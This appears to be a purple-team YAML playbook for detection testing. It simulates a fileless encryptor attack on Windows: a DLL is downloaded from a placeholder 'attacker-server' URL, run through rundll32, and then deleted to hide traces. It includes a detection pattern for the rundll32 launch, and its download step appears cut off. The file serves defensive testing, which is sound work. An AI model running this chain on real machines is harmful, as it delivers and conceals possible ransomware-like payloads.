  Purple team automation to deploy and execute NSFW polymorphic fileless encryptor DLL
  on Windows systems using rundll32.exe. Simulates Process Injection (T1055.001)
  and Obfuscated Files or Information (T1027) techniques for detection testing.

      Downloads the NSFW payload DLL to the target systemâ€™s temporary directory
      using PowerShell.

  - name: Execute NSFW DLL via rundll32.exe
    description: >
      Executes the NSFW DLL payload in memory via rundll32.exe to simulate fileless
      code execution and encryption activity.
    supported_platforms:
      - windows
    command: |
      rundll32.exe C:\Windows\Temp\nsfw.dll,PolymorphicEncryptorMain
    executor: command_prompt
    detection:
      - type: process_creation
        pattern: rundll32.exe
        detail: Launching rundll32.exe with suspicious DLL path C:\Windows\Temp\nsfw.dll

  - name: Validate NSFW payload execution
    description: >
      Checks for the presence of rundll32.exe processes linked to nsfw.dll to confirm
      payload execution.
    supported_platforms:
      - windows
    command: |
      powershell -NoProfile -Command "Get-Process rundll32 | Where-Object { $_.Path -like '*nsfw.dll*' }"
    executor: powershell

  - name: Cleanup NSFW DLL payload
    description: >
      Deletes the NSFW DLL payload from disk to maintain fileless footprint.
    supported_platforms:
      - windows
    command: |
      powershell -NoProfile -Command "Remove-Item C:\Windows\Temp\nsfw.dll -Force"
    executor: powershell

workflow:
  - step: Upload NSFW DLL payload
  - step: Execute NSFW DLL via rundll32.exe
  - step: Validate NSFW payload execution
  - step: Cleanup NSFW DLL payload

notes:
  - Replace "http://attacker-server/nsfw.dll" with your actual payload hosting URL.
  - Ensure PowerShell and rundll32.exe execution policies permit these actions.
  - Collect Sysmon or EDR logs for monitoring process creation and network events.
  - This workflow simulates a fileless encryptor attack for purple team detection tuning.
